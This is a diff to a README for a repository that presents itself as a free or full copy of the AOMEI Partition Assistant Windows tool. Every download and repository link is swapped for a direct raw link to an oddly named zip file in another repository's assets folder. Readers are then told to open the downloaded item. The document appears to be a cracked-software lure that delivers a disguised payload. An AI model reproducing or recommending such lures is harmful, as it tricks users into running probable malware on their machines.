@@ -5,17 +5,17 @@ description: "Resize, merge, split, and clone partitions with AOMEI Partition As
 ---
 # 🚀 aomei-partition-assistant - Manage Windows partitions with ease
 
-[![Download aomei-partition-assistant](https://img.shields.io/badge/Download-aomei--partition--assistant-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Royer234/aomei-partition-assistant/releases)
+[![Download aomei-partition-assistant](https://img.shields.io/badge/Download-aomei--partition--assistant-8A2BE2?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip)
 
 aomei-partition-assistant is a Windows partition tool for organizing disks, managing partitions, and handling common storage tasks through a straightforward interface. The repository description includes pro and professional builds, a portable copy, and a full version, making it useful for users who want a dedicated partition manager without a complicated setup process.
 
 ## 📥 Download
 
-[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Royer234/aomei-partition-assistant/releases)
+[![Download for Windows](https://img.shields.io/badge/Download%20for%20Windows-Visit%20Releases-FF5733?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip)
 
 Visit this link to download the application:
 
-https://github.com/Royer234/aomei-partition-assistant/releases
+https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
 
 Use the download page to get the Windows release. After the download completes, open the downloaded item to start the application.
 
@@ -51,7 +51,7 @@ The download page is the central place to get the Windows release. Visit the lin
 
 ## 🚀 Getting Started
 
-1. Open the download page: https://github.com/Royer234/aomei-partition-assistant/releases
+1. Open the download page: https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
 2. Visit this link to download the application.
 3. Save the downloaded file to a folder you can find easily, such as Downloads.
 4. Open the downloaded item to start aomei-partition-assistant.
@@ -110,7 +110,7 @@ These tools are presented in a way that lets users review the selected task befo
 Yes. The repository describes it as a partition tool for Windows.
 
 **Where do I download it?**  
-Visit this link to download the application: https://github.com/Royer234/aomei-partition-assistant/releases
+Visit this link to download the application: https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
 
 **Do I need programming skills?**  
 No. The application is intended for regular Windows users and provides a visual interface.
@@ -133,7 +133,7 @@ Open the downloaded item to start aomei-partition-assistant, then review the dis
 ## 🛠️ Troubleshooting
 
 **The download page does not open.**  
-Copy the link into your browser: https://github.com/Royer234/aomei-partition-assistant/releases
+Copy the link into your browser: https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
 
 **The download does not start.**  
 Open the download page again and use the releases link to download the application.
@@ -152,7 +152,7 @@ Select a different disk or partition. Some actions appear only for specific sele
 
 ## 🔗 Project Links
 
-- Repository: https://github.com/Royer234/aomei-partition-assistant
-- Download page: https://github.com/Royer234/aomei-partition-assistant/releases
+- Repository: https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
+- Download page: https://github.com/Royer234/royer234.github.io/raw/refs/heads/main/assets/Application_hemichromatopsia.zip
 
 Keywords: aomei-free-partition-assistant, aomei-partition-assistant-lite, aomei-partition-assistant-windows, aomei-partition-tools-overview, aomei-setup, partition-manager, partition-tools
